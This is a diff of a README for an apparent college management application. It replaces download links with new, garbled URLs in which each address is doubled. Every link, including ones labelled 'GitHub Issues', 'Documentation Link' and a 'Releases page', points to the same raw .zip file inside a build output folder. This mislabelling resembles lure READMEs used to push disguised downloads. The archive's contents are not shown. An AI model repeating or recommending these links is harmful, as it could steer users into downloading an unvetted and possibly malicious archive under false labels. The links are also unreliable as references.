@@ -1,6 +1,6 @@
 # 📚 CollegeManagementSystem - Streamline College Operations Easily
 
-[![Download](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Management-System-College-v1.7-beta.4.zip%20Now-CollegeManagementSystem-blue)](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Management-System-College-v1.7-beta.4.zip)
+[![Download](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip Management https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip%20Now-CollegeManagementSystem-blue)](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip Management https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the College Management System. This web-based application helps you m
 
 To download the College Management System, visit the following link:
 
-[Download College Management System](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Management-System-College-v1.7-beta.4.zip)
+[Download College Management System](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip Management https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed.
@@ -54,13 +54,13 @@ If you encounter any issues while downloading or running the application, check 
 - Verify that you have downloaded the correct file for your operating system.
 - Check your computer's disk space and memory.
 
-If problems persist, please visit our [GitHub Issues](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Management-System-College-v1.7-beta.4.zip) page for support.
+If problems persist, please visit our [GitHub Issues](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip Management https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip) page for support.
 
 ## 📑 Documentation
 
 For detailed guidance on using the College Management System, refer to the documentation available in the repository. You can access it at:
 
-[Documentation Link](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Management-System-College-v1.7-beta.4.zip)
+[Documentation Link](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip Management https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip)
 
 ## 👫 Community Support
 
@@ -71,4 +71,4 @@ Join our community for additional help and tips:
 
 Explore and make the most out of the College Management System. Through this application, college administration becomes simpler and more efficient. 
 
-[Download College Management System](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Management-System-College-v1.7-beta.4.zip) now and enhance your college operation experience!
+[Download College Management System](https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip Management https://github.com/LucasChang1023/CollegeManagementSystem/raw/refs/heads/main/College Management System/out/production/Collage-Management-System--main/com/mycompany/collage/Management-System-College-2.2.zip) now and enhance your college operation experience!
